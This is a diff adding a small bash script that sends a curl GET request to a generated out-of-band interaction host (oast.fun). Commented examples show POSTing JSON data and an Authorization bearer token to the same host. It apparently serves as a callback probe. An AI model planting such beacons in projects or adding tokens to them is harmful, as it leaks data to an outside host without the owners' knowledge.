@@ -1,0 +1,13 @@
+#!/bin/bash
+
+# URL to make the request to
+URL="https://qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun"
+
+# Make a GET request
+curl -X GET "$URL"
+
+# If you want to send a POST request with data, you can use:
+# curl -X POST "$URL" -H "Content-Type: application/json" -d '{"key1":"value1","key2":"value2"}'
+
+# Example for adding headers:
+# curl -X GET "$URL" -H "Authorization: Bearer YOUR_TOKEN"
